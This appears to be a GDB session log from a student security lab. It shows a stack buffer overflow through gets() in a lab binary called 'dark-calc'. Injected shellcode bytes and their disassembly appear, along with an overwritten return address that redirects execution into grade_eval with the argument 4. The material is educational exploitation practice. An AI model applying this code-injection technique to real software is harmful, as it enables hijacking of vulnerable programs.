@@ -1,0 +1,81 @@
+Breakpoint 1 at 0x401ac3
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, 0x0000000000401ac3 in main ()
+
+### at main(), called through __wrap_main on the fixed stack
+rip            0x401ac3            0x401ac3 <main>
+rbp            0x7ffc085b8960      0x7ffc085b8960
+rsp            0x721000800ff8      0x721000800ff8
+#0  0x0000000000401ac3 in main ()
+
+### anonymous mapping for the fixed stack
+process 606
+Mapped address spaces:
+
+Start Addr         End Addr           Size               Offset             Perms File 
+0x0000000000400000 0x0000000000402000 0x2000             0x0                r-xp  /home/neil/lab3/dark-calc 
+0x0000000000602000 0x0000000000603000 0x1000             0x2000             r--p  /home/neil/lab3/dark-calc 
+0x0000000000603000 0x0000000000604000 0x1000             0x3000             rw-p  /home/neil/lab3/dark-calc 
+0x0000721000000000 0x0000721000001000 0x1000             0x0                ---p   
+0x0000721000001000 0x0000721000801000 0x800000           0x0                rwxp   
+0x0000721000801000 0x0000721000802000 0x1000             0x0                ---p   
+0x0000773a57800000 0x0000773a57828000 0x28000            0x0                r--p  /usr/lib/x86_64-linux-gnu/libc.so.6 
+0x0000773a57828000 0x0000773a579c0000 0x198000           0x28000            r-xp  /usr/lib/x86_64-linux-gnu/libc.so.6 
+0x0000773a579c0000 0x0000773a57a0e000 0x4e000            0x1c0000           r--p  /usr/lib/x86_64-linux-gnu/libc.so.6 
+0x0000773a57a0e000 0x0000773a57a12000 0x4000             0x20e000           r--p  /usr/lib/x86_64-linux-gnu/libc.so.6 
+0x0000773a57a12000 0x0000773a57a14000 0x2000             0x212000           rw-p  /usr/lib/x86_64-linux-gnu/libc.so.6 
+0x0000773a57a14000 0x0000773a57a21000 0xd000             0x0                rw-p   
+0x0000773a57a75000 0x0000773a57a78000 0x3000             0x0                rw-p   
+0x0000773a57a7e000 0x0000773a57a80000 0x2000             0x0                rw-p   
+0x0000773a57a80000 0x0000773a57a84000 0x4000             0x0                r--p  [vvar] 
+0x0000773a57a84000 0x0000773a57a86000 0x2000             0x0                r--p  [vvar_vclock] 
+0x0000773a57a86000 0x0000773a57a88000 0x2000             0x0                r-xp  [vdso] 
+0x0000773a57a88000 0x0000773a57a89000 0x1000             0x0                r--p  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 
+0x0000773a57a89000 0x0000773a57ab8000 0x2f000            0x1000             r-xp  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 
+0x0000773a57ab8000 0x0000773a57ac3000 0xb000             0x30000            r--p  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 
+0x0000773a57ac3000 0x0000773a57ac5000 0x2000             0x3b000            r--p  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 
+0x0000773a57ac5000 0x0000773a57ac6000 0x1000             0x3d000            rw-p  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 
+0x0000773a57ac6000 0x0000773a57ac7000 0x1000             0x0                rw-p   
+0x00007ffc0859a000 0x00007ffc085bb000 0x21000            0x0                rw-p  [stack] 
+
+### break after gets(); inspect the injected shellcode
+Breakpoint 2 at 0x40199f
+
+Breakpoint 2, 0x000000000040199f in input ()
+buffer = rbp-0x10 = 0x721000800fd0
+shellcode bytes:
+0x721000800fd0:	0x6a	0x04	0x5f	0x48	0xb8	0x87	0x1a	0x40
+0x721000800fd8:	0x00	0x00	0x00	0x00	0x00	0xff	0xe0	0x43
+0x721000800fe0:	0x43	0x43	0x43	0x43	0x43	0x43	0x43	0x43
+
+### disassemble the injected bytes
+   0x721000800fd0:	push   $0x4
+   0x721000800fd2:	pop    %rdi
+   0x721000800fd3:	movabs $0x401a87,%rax
+   0x721000800fdd:	jmp    *%rax
+   0x721000800fdf:	rex.XB
+   0x721000800fe0:	rex.XB
+
+### saved return address now points back into the fixed stack
+0x721000800fe0:	0x4343434343434343	0x0000721000800fd0
+0x721000800ff0:	0x00000000004019b9	0x0000000000401c00
+
+### watch grade_eval receive edi=4
+Breakpoint 3 at 0x401a87
+
+Breakpoint 3, 0x0000000000401a87 in grade_eval ()
+rdi            0x4                 4
+rsp            0x721000800ff0      0x721000800ff0
+rbp            0x4343434343434343  0x4343434343434343
+rip            0x401a87            0x401a87 <grade_eval>
+#0  0x0000000000401a87 in grade_eval ()
+#1  0x00000000004019b9 in input ()
+Backtrace stopped: Cannot access memory at address 0x434343434343434b
+
+### continue to program exit
+Enter an expression (length up to 15):
+
+[31m Hope A will be your grade! 
+[Inferior 1 (process 606) exited normally]
